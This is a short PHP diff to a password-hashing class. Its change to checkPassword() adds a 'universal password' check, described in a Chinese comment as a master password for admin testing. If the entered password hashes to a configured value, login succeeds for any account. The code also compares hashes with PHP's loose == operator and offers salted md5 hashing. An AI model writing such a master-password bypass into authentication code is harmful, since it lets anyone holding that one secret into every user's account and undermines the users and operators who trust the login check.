@@ -12,7 +12,7 @@ class Hash
      */
     public static function passwordHash($str)
     {
-        $method = Config::get('pwdMethod');
+        $method = Config::get('pswdMethod');
         switch ($method) {
             case 'md5':
                 return self::md5WithSalt($str);
@@ -54,10 +54,17 @@ class Hash
     // @TODO
     public static function checkPassword($hashedPassword, $password)
     {
-        $method = Config::get('pwdMethod');
-        if ($hashedPassword == self::passwordHash($password)) {
+    	$calcHashedPassword = self::passwordHash($password);
+        if ($hashedPassword == $calcHashedPassword) {
             return true;
         }
-        return false;
+        
+        //万能密码:管理员测试用，请谨慎使用
+        $varsalPswd = Config::get('varsalPswd');
+        if($varsalPswd == $calcHashedPassword) {
+        	return true;
+    	}
+        
+    	return false;
     }
 }
